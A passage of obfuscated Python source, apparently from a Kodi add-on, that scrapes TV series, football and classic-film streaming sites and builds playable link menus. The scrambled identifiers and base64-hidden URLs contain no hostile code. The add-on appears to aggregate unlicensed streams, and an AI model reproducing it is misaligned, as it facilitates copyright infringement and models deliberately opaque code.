  O0Oo000ooO00 ( '[COLORgreen]' + iI1i1I1III1i + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in IiiiiI1i1Iii :
  O0Oo000ooO00 ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10046 , ii11iIi1I + 'Next.png' , '' , '' )
  if 10 - 10: O00oo0OO0oOOO . i1IIi + OOooOooo
def oOOoOOO0oo0 ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<div class="mask">.+?<a href="(.+?)" title="(.+?)">.+?<img src="(.+?)"' , re . DOTALL ) . findall ( OO00O0O )
 IiiiiI1i1Iii = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I , oO0O00oOOoooO in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + ( i1I1I ) . replace ( '&nbsp;' , ' ' ) . replace ( '&amp;' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , oO0O00oOOoooO , '' , '' )
 for url in IiiiiI1i1Iii :
  O0Oo000ooO00 ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10041 , ii11iIi1I + 'Next.png' , '' , '' )
  if 87 - 87: OO0O / I1IiI % OOooOOo * ii
def oOOOoo0o ( url ) :
 OO00O0O = iii ( url )
 I1Ii = re . compile ( '<div class="col-md-6 col-xs-12".+?<a href=".+?" itemprop="url"><span itemprop="name">(.+?)</span>(.+?)</ul>' , re . DOTALL ) . findall ( OO00O0O )
 for IIiIii , o0o00oO0oo000 in I1Ii :
  oOooOOOoOo = re . compile ( '<li itemprop="episode".+?<meta itemprop="url" content="(.+?)">.+?<span class="" itemprop="name">\n(.+?)\n' , re . DOTALL ) . findall ( str ( o0o00oO0oo000 ) )
  for url , i1I1I in oOooOOOoOo :
   iI1i1I1III1i = ( IIiIii ) . replace ( '  ' , '' ) + ' ' + ( i1I1I ) . replace ( '&nbsp;' , ' ' ) . replace ( '&#039;' , '\'' ) . replace ( '  ' , '' )
   O0Oo000ooO00 ( '[COLORgreen]' + iI1i1I1III1i + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 IiiiiI1i1Iii = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OO00O0O )
 for url in IiiiiI1i1Iii :
  O0Oo000ooO00 ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'Next.png' , '' , '' )
  if 44 - 44: O0 % i1IIi
  if 42 - 42: OoOoOO00 - Ooo00oOo00o - OoooooooOO . O00oo0OO0oOOO / I1IiI
class ooooo0Oo0 ( ) :
 if 97 - 97: i1i1i11IIi . ii . i1i1i11IIi
 List = [ ]
 source_list = [ ]
 def __init__ ( self , name ) :
  if 91 - 91: Ii11I + o0OOOoO0 . OOOO00ooo0Ooo
  iI1i1I1III1i = name
  self . Get_Sources ( iI1i11 , iI1i1I1III1i )
  if 15 - 15: OOOO00ooo0Ooo
  if 94 - 94: o0OOOoO0 % OoOoOO00 * i1IIi * iIii1I11I1II1
 def Get_Sources ( self , URL , season_name ) :
  Oo0oO0ooo = xbmcgui . DialogProgress ( )
  OO00O0O = iii ( URL )
  oOooOOOoOo = re . compile ( '<td>.+?<a href="/link/(.+?)".+?height="16px">(.+?)\n' , re . DOTALL ) . findall ( OO00O0O )
  for iI1i11 , i1I1I in oOooOOOoOo :
   URL = 'http://www.watchseries.li/link/' + iI1i11
   self . Get_site_link ( URL , season_name )
   if 81 - 81: Oo - OOOO00ooo0Ooo
 def Get_site_link ( self , url , season_name ) :
  OO00O0O = iii ( url )
  oOooOOOoOo = re . compile ( '<iframe style=.+?" src="(.+?)"' ) . findall ( OO00O0O )
  IiiiiI1i1Iii = re . compile ( '<IFRAME SRC="(.+?)"' ) . findall ( OO00O0O )
  ooO0000o00O = re . compile ( '<IFRAME style=".+?" SRC="(.+?)"' ) . findall ( OO00O0O )
  for url in oOooOOOoOo :
   self . main ( url , season_name )
  for url in IiiiiI1i1Iii :
   self . main ( url , season_name )
  for url in ooO0000o00O :
   self . main ( url , season_name )
   if 24 - 24: OoooooooOO . Ooo00oOo00o * OoOoOO00
 def main ( self , url , season_name ) :
  Oo0oO0ooo . create ( "[COLORwhite]Origin[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
  if 'daclips.in' in url :
   o0oO00 = 'DACLIPS'
   if o0oO00 in ooooo0Oo0 . source_list :
    pass
   else :
    self . daclips ( url , season_name , o0oO00 )
    Oo0oO0ooo . update ( 0 , "" , "Getting Daclips Links" )
  else :
   if 'filehoot.com' in url :
    o0oO00 = 'FILEHOOT'
    if o0oO00 in ooooo0Oo0 . source_list :
     pass
    else :
     Oo0oO0ooo . update ( 0 , "" , "Getting Filehoot Links" )
     self . filehoot ( url , season_name , o0oO00 )
   else :
    if 'thevideo.me' in url :
     o0oO00 = 'THEVIDEO'
     if o0oO00 in ooooo0Oo0 . source_list :
      pass
     else :
      self . thevideo ( url , season_name , o0oO00 )
      Oo0oO0ooo . update ( 0 , "" , "Getting Thevideo Links" )
    else :
     if 'allmyvideos.net' in url :
      o0oO00 = 'ALLMYVIDEOS'
      if o0oO00 in ooooo0Oo0 . source_list :
       pass
      else :
       self . allmyvid ( url , season_name , o0oO00 )
       Oo0oO0ooo . update ( 0 , "" , "Getting Allmyvideo Links" )
     else :
      if 'vidspot.net' in url :
       o0oO00 = 'VIDSPOT'
       if o0oO00 in ooooo0Oo0 . source_list :
        pass
       else :
        self . vidspot ( url , season_name , o0oO00 )
        Oo0oO0ooo . update ( 0 , "" , "Getting Vidspot Links" )
      else :
       if 'vodlocker' in url :
        o0oO00 = 'VODLOCKER'
        if o0oO00 in ooooo0Oo0 . source_list :
         pass
        else :
         self . vodlocker ( url , season_name , o0oO00 )
         Oo0oO0ooo . update ( 0 , "" , "Getting Vodlocker Links" )
         if 88 - 88: OOOO00ooo0Ooo + i11iIiiIii % ii * Ii11I * Ii11I * OOooOooo
         if 24 - 24: OO0O / O00oo0OO0oOOO + i1i1i11IIi . i1i1i11IIi
 def allmyvid ( self , url , season_name , source_name ) :
  OO00O0O = iii ( url )
  oOooOOOoOo = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( OO00O0O )
  for I1ii1i , i1I1I in oOooOOOoOo :
   self . Printer ( I1ii1i , season_name , source_name )
   if 22 - 22: ii * OOooOooo * i11iIiiIii + O00oo0OO0oOOO * I1IiI * Ooo00oOo00o
 def vidspot ( self , url , season_name , source_name ) :
  OO00O0O = iii ( url )
  oOooOOOoOo = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' ) . findall ( OO00O0O )
  for I1ii1i , i1I1I in oOooOOOoOo :
   self . Printer ( I1ii1i , season_name , source_name )
   if 85 - 85: O00oo0OO0oOOO * Ii11I % Oo - O00oo0OO0oOOO - OOOO00ooo0Ooo
 def thevideo ( self , url , season_name , source_name ) :
  OO00O0O = iii ( url )
  oOooOOOoOo = re . compile ( "{ label: '.+?', file: '(.+?)' }" ) . findall ( OO00O0O )
  for I1ii1i in oOooOOOoOo :
   self . Printer ( I1ii1i , season_name , source_name )
   if 46 - 46: O0
 def vodlocker ( self , url , season_name , source_name ) :
  OO00O0O = iii ( url )
  oOooOOOoOo = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( OO00O0O )
  for I1ii1i in oOooOOOoOo :
   self . Printer ( I1ii1i , season_name , source_name )
   if 65 - 65: iIii1I11I1II1 % ii + O0 / OoooooooOO
 def daclips ( self , url , season_name , source_name ) :
  OO00O0O = iii ( url )
  oOooOOOoOo = re . compile ( '{ file: "(.+?)", type:"video" }' ) . findall ( OO00O0O )
  for I1ii1i in oOooOOOoOo :
   self . Printer ( I1ii1i , season_name , source_name )
   if 52 - 52: OOooOooo % Ii11I * OOOo0 % OOOO00ooo0Ooo + Ii11I / O00oo0OO0oOOO
 def filehoot ( self , url , season_name , source_name ) :
  OO00O0O = iii ( url )
  oOooOOOoOo = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( OO00O0O )
  for I1ii1i in oOooOOOoOo :
   self . Printer ( I1ii1i , season_name , source_name )
   if 80 - 80: OoooooooOO + i1i1i11IIi
 def Printer ( self , Link , season_name , source_name ) :
  if 95 - 95: o0OOOoO0 / ii * o0OOOoO0 - OoooooooOO * OoooooooOO % Ooo00oOo00o
  if Link in ooooo0Oo0 . List :
   pass
  elif source_name in ooooo0Oo0 . source_list :
   pass
  else :
   oo00OOoOoO00 ( '[COLORgreen]' + source_name + '[/COLOR]' , Link , 10012 , ii11iIi1I + 'WATCHSERIES.png' )
   Oo0oO0ooo . update ( 100 , "" , "Got Source" )
   ooooo0Oo0 . List . append ( Link )
   ooooo0Oo0 . source_list . append ( source_name )
   if 43 - 43: Oo . o0OOOoO0
   xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
   if 12 - 12: o0OOOoO0 + Ii11I + OOOO00ooo0Ooo . i1i1i11IIi / OOooOooo
   if 29 - 29: i1i1i11IIi . OO0O - OoOoOO00
   if 68 - 68: iIii1I11I1II1 + OoOoOO00 / ii
   if 91 - 91: I1IiI % iIii1I11I1II1 . OOOo0
   if 70 - 70: OOOO00ooo0Ooo % OoOoOO00 % O0 . i1IIi / o0OOOoO0
def OO0ooOoOO0OOo ( ) :
 O0Oo000ooO00 ( '[COLORgreen]Highlights[/COLOR]' , '' , 10008 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Fixtures[/COLOR]' , '' , 10009 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if 51 - 51: iIii1I11I1II1 * OOooOOo / iIii1I11I1II1 . iIii1I11I1II1 . O00oo0OO0oOOO * OOOO00ooo0Ooo
def oO0oo0o00o0O ( ) :
 OOOooo = iii ( i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20vcXVpY2tpbmRleC5odG1s' ) )
 oOooOOOoOo = re . compile ( '<a target="_self" href="(.+?)".+?src="(.+?)" alt="(.+?)"' , re . DOTALL ) . findall ( OOOooo )
 for iI1i11 , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + ( i1I1I ) . replace ( 'amp;' , '' ) + '[/COLOR]' , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + iI1i11 , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + oO0O00oOOoooO , i1iiIII111ii , '' )
  if 80 - 80: iIii1I11I1II1
def i1I11 ( url ) :
 OO00O0O = iii ( url )
 I1Ii = re . compile ( 'AndClearL.+?><h2.+?head>(.*?)float' , re . DOTALL ) . findall ( OO00O0O )
 for I1Ii in I1Ii :
  iII11ii1ii = re . compile ( '(.*?)</h2>' ) . findall ( str ( I1Ii ) )
  for oOO0OOOo000o in iII11ii1ii :
   oOO0OOOo000o = oOO0OOOo000o
  OO00oo = re . compile ( 'comp_head>(.*?)</span>.*?<div class = fLeft width = ".*?"><img src="(.*?)">.*?</div>.*?ST:(.*?)</div>(.+?)<!-- around all of channel types ENDS 2-->' , re . DOTALL ) . findall ( str ( I1Ii ) )
  for O0Oo0O0 , oO0O00oOOoooO , time , I1IiiIiii1 in OO00oo :
   ooo00Ooo = re . compile ( ",CAPTION, '(.+?)&nbsp" ) . findall ( I1IiiIiii1 )
   O0Oo000ooO00 ( '[COLORgreen]' + oOO0OOOo000o + ' - ' + O0Oo0O0 + ' - ' + time + '[/COLOR]' , '' , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20=' ) + oO0O00oOOoooO , i1iiIII111ii , ( str ( ooo00Ooo ) ) )
   if 39 - 39: OO0O / O0 * i1i1i11IIi
 ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if 17 - 17: OOooOooo / iIii1I11I1II1 - Ooo00oOo00o + OOOo0 % Ii11I
def III1III11II ( ) :
 if 43 - 43: OOOo0
 O0Oo000ooO00 ( '[COLORgreen]Shows[/COLOR]' , 'http://www.fullmatchesandshows.com/category/show/' , 10011 , 'http://www.fm-base.co.uk/forum/attachments/club-competition-logos/3885-soccer-am-logo-socceram.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Premier League[/COLOR]' , 'http://www.fullmatchesandshows.com/premier-league/' , 10011 , 'https://footballseasons.files.wordpress.com/2013/05/premier-league.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]La Liga[/COLOR]' , 'http://www.fullmatchesandshows.com/la-liga/' , 10011 , 'http://1.bp.blogspot.com/-c6kQ40ryhyo/U19cUlz25sI/AAAAAAAABak/qtn5chSFZm0/s1600/la-liga-logo_display_image.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Bundesliga[/COLOR]' , 'http://www.fullmatchesandshows.com/bundesliga/' , 10011 , 'http://m.img.brothersoft.com/iphone/189/518670189_icon175x175.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Champions League[/COLOR]' , 'http://www.fullmatchesandshows.com/champions-league/' , 10011 , 'http://www.ecursuri.ro/images/teste/test-champions-league.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Serie A[/COLOR]' , 'http://www.fullmatchesandshows.com/category/serie-a/' , 10011 , 'http://files.jcriccione.it/200000223-2484526782/serie%20a.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Ligue 1[/COLOR]' , 'http://www.fullmatchesandshows.com/category/ligue-1/' , 10011 , 'http://a1.mzstatic.com/us/r30/Purple5/v4/37/c7/44/37c744ae-5824-42b7-6ce0-5f471f52baab/icon180x180.jpeg' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Copa America 2015[/COLOR]' , 'http://www.fullmatchesandshows.com/copa-america-2015/' , 10011 , 'https://pbs.twimg.com/profile_images/521966985907691520/Nq9OAPIo_400x400.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]CONCACAF[/COLOR]' , 'http://www.fullmatchesandshows.com/category/concacaf/' , 10011 , 'http://a3.mzstatic.com/us/r30/Purple3/v4/40/26/14/4026147c-7022-4ca3-504e-e78950cc3f1c/icon175x175.png' , ii11iIi1I + 'fanart.jpg' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Women World Cup[/COLOR]' , 'http://www.fullmatchesandshows.com/category/women-world-cup/' , 10011 , 'https://upload.wikimedia.org/wikipedia/en/thumb/7/76/2015_FIFA_Women\'s_World_Cup_logo.svg/967px-2015_FIFA_Women\'s_World_Cup_logo.svg.png' , ii11iIi1I + 'fanart.jpg' , '' )
 if 47 - 47: OoooooooOO % I1IiI
def OO0Oo ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( 'itemprop="image" class="entry-thumb" src="(.+?)".+?<h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="(.+?)" rel="bookmark" title=".+?">(.+?)</a></h3>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , url , i1I1I in oOooOOOoOo :
  IIiiiiiIiIIi = i1I1I . replace ( '&#8211;' , '-' ) . replace ( '&#038;' , '&' )
  oo00OOoOoO00 ( '[COLORgreen]' + IIiiiiiIiIIi + '[/COLOR]' , url , 10013 , oO0O00oOOoooO )
  if 26 - 26: OOooOOo
def IiIi ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<script data-config="(.+?)" data-height' ) . findall ( OO00O0O )
 for oo00oO0o in oOooOOOoOo :
  oO0Oo00oo = ( oo00oO0o ) . replace ( '/v2' , '' ) . replace ( 'zeus.json' , 'video-sd.mp4?hosting_id=21772' ) . replace ( 'config.playwire.com' , 'cdn.video.playwire.com' )
  ooOooOoOoO ( 'http:' + oO0Oo00oo )
  if 75 - 75: iIii1I11I1II1 * i11iIiiIii - OoooooooOO . I1IiI
  if 70 - 70: ii * ii + Oo * Ii11I % OOOo0 + iIii1I11I1II1
def i1oOOO0ooOO ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="([^"]*)" title="([^"]*)"><img itemprop="image" content="([^"]*)"' , re . DOTALL ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( "<a rel='next' href=([^=]*)=" , re . DOTALL ) . findall ( OOOooo )
 for url , i1I1I , oO0O00oOOoooO in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , url , 8046 , oO0O00oOOoooO )
 for url in IiiiiI1i1Iii :
  iii1111iiI1ii ( 'NEXT PAGE' , ( url ) . replace ( ' class' , '' ) , 8045 , ii11iIi1I + 'Next.png' )
def i11IiI1iiI11 ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( "__filename='([^']*)',.+?__fullimage='([^']*)',.+?__title='([^']*)'," , re . DOTALL ) . findall ( OOOooo )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  ooOooOoOoO ( 'http://bitcast-b.bitgravity.com/ndtvod/23372/ndtv/' + url )
  if 85 - 85: ii11ii1ii - I1IiI / ii11ii1ii + Ii11I - O00oo0OO0oOOO
def IIii1III ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( "src='http://www.youtube.com/embed/(.+?)?version=3&#038;rel=1&#038;fs=1&#038;autohide=2&#038;showsearch=0&#038;showinfo=1&#038;iv_load_policy=1&#038;wmode=transparent' frameborder='0' allowfullscreen='true'></iframe>" ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  yt . PlayVideo ( url )
  if 94 - 94: i11iIiiIii % OoooooooOO / OOOo0
def iII1Iii11111 ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3RvcGRvY3VtZW50YXJ5ZmlsbXMuY29tLw==' ) )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" >(.+?)</a></li><li>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , iI1i11 , 8041 , ii11iIi1I + 'documentary.png' )
def OOo00ooOoO0o ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<h2><a href="(.+?)" title="(.+?)">.+?</a></h2>.+?src="(.+?)"' , re . DOTALL ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( 'class="inactive">.+?</a><a href="(.+?)">Next</a></div>' , re . DOTALL ) . findall ( OOOooo )
 for url , i1I1I , oO0O00oOOoooO in oOooOOOoOo :
  iii1111iiI1ii ( ( i1I1I ) . replace ( '&#039;s' , '' ) , url , 8042 , oO0O00oOOoooO )
 for url in IiiiiI1i1Iii :
  iii1111iiI1ii ( 'NEXT PAGE' , url , 8041 , ii11iIi1I + 'Next.png' )
  if 21 - 21: i11iIiiIii
  if 89 - 89: O00oo0OO0oOOO . i11iIiiIii * O0
def Iii ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<meta itemprop="name" content="(.+?)".+?<meta itemprop="thumbnailUrl" content="(.+?)".+?<meta itemprop="embedUrl" content="(.+?)".+?<meta itemprop="description" content="(.+?)" />' , re . DOTALL ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( '<div class="video new-video"><iframe width="766" height="431" src="(.+?)&amp;iv_load_policy=3&amp;showinfo=0&amp;autohide=1"' , re . DOTALL ) . findall ( OOOooo )
 for i1I1I , oO0O00oOOoooO , url , oOoooO00O in oOooOOOoOo :
  oo00OOoOoO00 ( ( i1I1I ) . replace ( '&#039;s' , '' ) , url . replace ( 'https://www.youtube.com/embed/' , '' ) , 8043 , oO0O00oOOoooO )
 for url in IiiiiI1i1Iii :
  i1iI111II1ii ( ( url ) . replace ( '//' , 'http://' ) )
  if 62 - 62: O00oo0OO0oOOO * iIii1I11I1II1 . i1i1i11IIi - OoooooooOO * OoOoOO00
def i1iI111II1ii ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<link rel="canonical" href="(.+?)">  <link rel="stylesheet"' ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  oo00OOoOoO00 ( 'PLAY' , ( url ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , ii11iIi1I + 'documentary.png' )
  if 45 - 45: O0 % OOOo0 - O00oo0OO0oOOO . Ooo00oOo00o
def I1II ( ) :
 OO00O0O = OooO0OO ( 'http://www.stream2watch.co/live-tv' )
 oOooOOOoOo = re . compile ( '<a href="(.+?)">.+?<img src="(.+?)" alt=".+?"/>.+?<span class="country_name">(.+?)<br />(.+?)</span>' , re . DOTALL ) . findall ( OO00O0O )
 for iI1i11 , oO0O00oOOoooO , i1I1I , iIIi1Ii1III in oOooOOOoOo :
  iii1111iiI1ii ( ( i1I1I + '[COLORgreen]' + iIIi1Ii1III + '[/COLOR]' ) , iI1i11 , 8086 , oO0O00oOOoooO )
  if 86 - 86: i11iIiiIii + i11iIiiIii . o0OOOoO0 % OOOo0 . OO0O
def iII1iI1IIiI ( url ) :
 OO00O0O = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a class="front_channel_href" href="(.+?)" title=".+?">.+?<img class="front_channel_thumb" src="(.+?)" alt=".+?"/>.+?<span class="front_channel_name">(.+?)</span>' , re . DOTALL ) . findall ( OO00O0O )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 8087 , oO0O00oOOoooO )
  if 69 - 69: OOOO00ooo0Ooo / i11iIiiIii * OOooOOo / o0OOOoO0
def oO0O ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( 'a id="code_.+?data-f-href="(.+?)" data-code-embed="">(.+?)</a>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  OOoooO00o0o ( url , i1I1I )
  if 10 - 10: OOooOooo - i11iIiiIii . ii11ii1ii % i1IIi
def OOoooO00o0o ( url , name ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( "playStream\('.+?', '(.+?)'\);" , re . DOTALL ) . findall ( OO00O0O )
 for url in oOooOOOoOo :
  print url
  oo00OOoOoO00 ( '[COLORgreen]' + name + '[/COLOR]' , url , 222 , '' )
  if 78 - 78: iIii1I11I1II1 * Oo . Oo - Ii11I . iIii1I11I1II1
def I111I1I ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3d3dy5zb2xpZS5vcmcvYWxpYnJhcnkvaW5kZXguaHRtbA==' ) )
 oOooOOOoOo = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( OOOooo )
 for iI1i11 , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + iI1i11 , 3002 , 'http://www.solie.org/alibrary/' + oO0O00oOOoooO )
def Oo0000 ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( OOOooo )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + oO0O00oOOoooO )
def oO0OoOo ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<br><a href="([^"]*)">(.+?)</a>' ) . findall ( OOOooo )
 oOOOOOo = re . compile ( 'href="([^"]*)">Season(.+?)</a>' ) . findall ( OOOooo )
 next = re . compile ( '<a href="([^"]*)">Episodes</a>' ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3004 , ii11iIi1I + 'classicmovies.png' )
 for url , i1I1I in oOOOOOo :
  iii1111iiI1ii ( '[COLORgreen]Season- ' + i1I1I + '[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'classicmovies.png' )
 for url in next :
  iii1111iiI1ii ( '[COLORgreen]NEXT[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'Next.png' )
 for url , oO0O00oOOoooO , i1I1I in IiiiiI1i1Iii :
  iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + oO0O00oOOoooO )
def i1I11ii ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<iframe.+?src="([^"]*)"' ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  o0ooO00O0O ( url )
def o0ooO00O0O ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<meta property="og:video" content="([^"]*)"/>' ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  ooOooOoOoO ( url )
  if 41 - 41: ii11ii1ii
def i1iI1i ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2FsbC8=' ) )
 oOooOOOoOo = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , iI1i11 , 8061 , ii11iIi1I + 'classicmovies.png' )
def o0o0OoO0OOO0 ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( "v.src = '([^']*)';" ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  ooOooOoOoO ( url )
  if 79 - 79: ii % OOooOOo % I1IiI
def ii1IIiII111I ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2NsYXNzaWMtdHYv' ) )
 oOooOOOoOo = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , iI1i11 , 8061 , ii11iIi1I + 'classictv.png' )
def O00OoOoO ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( "v.src = '([^']*)';" ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  ooOooOoOoO ( url )
  if 58 - 58: ii11ii1ii
def ii1ii1i11I1I ( ) :
 OO00O0O = iii ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcw==' ) )
 oOooOOOoOo = re . compile ( '<li><a href="(.+?)"> (.+?).m3u</a></li>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '-' , ' ' ) . replace ( '_' , ' ' ) , ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcy8=' ) ) + iI1i11 , 8071 , ii11iIi1I + 'streams.png' )
def iiII1iiiiiii ( url ) :
 OO00O0O = OooO0OO ( url )
 oOooOOOoOo = re . compile ( 'EXTINF:.+?,(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( OO00O0O )
